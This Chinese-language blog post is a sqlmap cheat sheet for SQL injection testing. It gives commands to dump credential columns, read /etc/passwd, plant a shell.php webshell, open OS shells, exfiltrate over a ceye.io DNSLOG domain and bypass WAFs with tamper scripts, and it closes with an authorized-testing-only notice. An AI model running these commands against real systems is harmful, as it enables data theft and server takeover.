---
title: "sqlmap 使用速查与进阶技巧大全"
slug: sqlmap-cheatsheet-and-advanced-usage
cover: ""
date: 2026-01-08
categories:
  - Web安全
  - SQL注入
  - 工具使用
tags:
  - DNSLOG
  - sqlmap
  - 自动化注入
halo:
  site: http://www.hzhsec.top
  name: a4080873-35f6-48bd-b1d3-0cdd1f53478e
  publish: true
---

<!--more-->





# sqlmap 使用速查与进阶技巧


本文分为：基础枚举 / 权限与文件 / 命令交互与 Shell / 请求写法（POST/JSON/HEAD/Cookie/文件上传）/ 绕过与 Tamper / 代理与调试 / 带外（DNSLOG）/ 常见示例。

---

## 一、基础枚举（快速命令）

> 目标：确认注入、列出库表列、导出数据

* 指定目标参数（最常见）

```bash
sqlmap -u "http://vuln/?id=1" -p id
```

* 当前数据库

```bash
sqlmap -u "http://vuln/?id=1" --current-db
```

* 列出数据库

```bash
sqlmap -u "http://vuln/?id=1" --dbs
```

* 列出指定库的表

```bash
sqlmap -u "http://vuln/?id=1" -D target_db --tables
# 或
sqlmap -u "http://vuln/?id=1" --tables -D target_db
```

* 列出表的列

```bash
sqlmap -u "http://vuln/?id=1" -D target_db -T target_table --columns
```

* 导出（dump）指定列或整表

```bash
# 导出表中所有列
sqlmap -u "http://vuln/?id=1" -D target_db -T target_table --dump
# 只导出特定列
sqlmap -u "http://vuln/?id=1" -D target_db -T target_table -C "username,password" --dump
```

---

## 二、权限枚举与文件操作

> 目标：判断权限、读取/写入文件

* 判断是否为 DBA（高权限）

```bash
sqlmap -u "http://vuln/?id=1" --is-dba
```

* 查看权限细节

```bash
sqlmap -u "http://vuln/?id=1" --privileges
```

* 从服务器读取文件（file-read）

```bash
sqlmap -u "http://vuln/?id=1" --file-read="/etc/passwd"
# Windows 示例
sqlmap -u "http://vuln/?id=1" --file-read="C:\\\\Windows\\\\win.ini"
```

* 写文件到服务器（file-write）
  需要 FILE 权限，并受 `secure-file-priv` 限制

```bash
sqlmap -u "http://vuln/?id=1" --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"
```

> 写入后访问 `http://target/shell.php` （注意风险与合法性）

---

## 三、交互式命令与 Shell

* 交互式 SQL shell

```bash
sqlmap -u "http://vuln/?id=1" --sql-shell
```

* 执行单条系统命令（os-cmd）

```bash
sqlmap -u "http://vuln/?id=1" --os-cmd "whoami"
```

* 交互式系统 shell（如果支持）

```bash
sqlmap -u "http://vuln/?id=1" --os-shell
```

> 注意：os-shell/os-cmd 需目标具备相应的提权或数据库扩展能力（例如写入 Webshell、调用 xp_cmdshell（MSSQL），或利用 UDF 等）。

---

## 四、提交方法：POST / JSON / HEAD / Cookie / 文件上传

* POST 数据（普通表单）

```bash
sqlmap -u "http://vuln/login.php" --data="username=admin&password=123" -p username
```

* 从请求文件读取（抓包导入）

```bash
sqlmap -r req.txt -p username
```

* 设置 Cookie

```bash
sqlmap -u "http://vuln/?id=1" --cookie="PHPSESSID=xxx; uid=1"
```

* 自定义请求头（比如 JSON）

```bash
sqlmap -u "http://vuln/api/search" --data='{"q":"test"}' --headers="Content-Type: application/json" -p q
```

* 上传文件点测试（模拟 multipart/form-data）
  通常把抓包的 POST 全部放入 `req.txt`，然后：

```bash
sqlmap -r req.txt -p upload
```

* 指定参数名（-p）

```bash
sqlmap -u "http://vuln/?id=1&name=foo" -p "name"
```

* CSRF token 支持（若页面需要）

```bash
sqlmap -u "http://vuln/" --data="token=abc&id=1" --csrf-token=token
```

---

## 五、带外 / DNSLOG（OOB）实战

> 当没有回显且盲注/延时不可用时，使用 DNS/OUT-OF-BAND 渠道（Sqlmap 支持 DNS 外联回显）

* 使用 DNSLOG（先在平台获取域名，如 `abc.xxx.ceye.io`），然后：

```bash
sqlmap -u "http://vuln/?id=1" --dns-domain="abc.xxx.ceye.io" --threads=1
```

* 或者结合读取函数生成外联（如 LOAD_FILE 触发 UNC），sqlmap 会尝试把数据通过 DNS 请求回传到你的域名。
* OOB 检测在某些环境中生效更好（尤其是 Windows SMB/UNC 能触发远程日志时）。

---

## 六、绕过与 Tamper 脚本

* 常见用途：绕过 WAF、大小写过滤、关键词过滤、编码过滤等。
* 调用已有 tamper 脚本：

```bash
sqlmap -u "http://vuln/?id=1" --tamper=space2comment,between
```

* 将 payload 自动 base64（示例）

```bash
sqlmap -u "http://vuln/?id=1" --tamper=base64encode
```

* 自定义 tamper（示例 skeleton）

```python
# example tamper 脚本：tamper/mytamper.py
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    if payload:
        payload = payload.replace('SELECT','SeLeCt')
        payload = payload.replace('OR','Or')
    return payload
```

把脚本放到 sqlmap 的 `tamper/` 目录，使用 `--tamper=mytamper`。

**实战建议**：先用 `--tamper` 少量组合测试，避免产生太多噪音且降低误报率。

---

## 七、代理 / 指纹 / 调试参数

* 代理（抓包或走折返）

```bash
sqlmap -u "http://vuln/?id=1" --proxy="http://127.0.0.1:8080"
```

* 详细等级（verbosity）

```bash
-v 3   # 0-6，数值越大信息越详细
```

* 随机 UA 或自定义 UA

```bash
--random-agent
--user-agent="Mozilla/5.0 (X11; Linux x86_64)..."
```

* 调整延时、超时与线程

```bash
--time-sec=3     # 延时时间（用于 time-based）
--timeout=15     # 请求超时
--threads=5      # 并发线程数（提高速度，注意不要过载目标）
```

* 测试等级与风险（更多扫描）

```bash
--level=3    # 1-5，数字越高 sqlmap 尝试的 payload 与测试点越多
--risk=2     # 0-3，risk 越高会尝试更具破坏性/风险的 payload（如写操作）
```

---

## 八、技术类型（--technique / -T）

指定注入类型优先顺序（加快定位）：

* B = Boolean-based blind
* E = Error-based
* U = UNION query
* S = Stacked queries
* T = Time-based blind

示例：只测试布尔与报错型

```bash
sqlmap -u "http://vuln/?id=1" --technique=BE
```

---

## 九、避免噪音与自动化选项

* 批处理模式（不交互）

```bash
--batch
```

* 跳过系统数据库

```bash
--exclude-sysdbs
```

* 跳过特定库/表

```bash
--skip=db1,db2
```

---

## 十、常见实战示例

* 基本枚举并导出 admin 表：

```bash
sqlmap -u "http://vuln/?id=1" -p id --dbs
sqlmap -u "http://vuln/?id=1" -p id -D mydb --tables
sqlmap -u "http://vuln/?id=1" -p id -D mydb -T admin --columns
sqlmap -u "http://vuln/?id=1" -p id -D mydb -T admin -C "username,password" --dump
```

* JSON POST 注入（指定 header）

```bash
sqlmap -u "http://vuln/api" --data='{"q":"test"}' -p q --headers="Content-Type: application/json"
```

* 用抓包文件（包含 multipart 上传）测试

```bash
sqlmap -r req.txt --level=5 --risk=3
```

* 使用 DNSLOG 做带外回显

```bash
sqlmap -u "http://vuln/?id=1" --dns-domain="yourid.ceye.io" --batch
```

* 加强检测、并配合 tamper 绕过（示例）

```bash
sqlmap -u "http://vuln/?id=1" --data="id=1" -p id --level=5 --risk=3 --tamper=between,randomcase --batch
```

---

## 十一、安全与合规提示

* 仅在授权范围内测试（公司内网、CTF、靶场、你有书面授权的目标）；
* `--file-write`、`--os-shell`、`--os-cmd` 将产生高破坏风险，谨慎使用；
* 导出与写文件可能触发入侵检测（IDS/IPS）或破坏系统稳定性，提前告知被授权方并获取允许；
* 对渗透结果做好记录，避免在未授权环境造成数据泄露或法律问题。

---

## 十二、延伸学习

* 阅读 sqlmap 官方文档与 tamper 脚本源码来理解 payload 如何被修改；
* 在靶场（DVWA、Mutillidae、vulnweb、OWASP Juice Shop）练习不同参数组合与 tamper；
* 学会在 Burp 中修改与重放请求，再将抓包保存为 req.txt 用 `-r` 调用 sqlmap。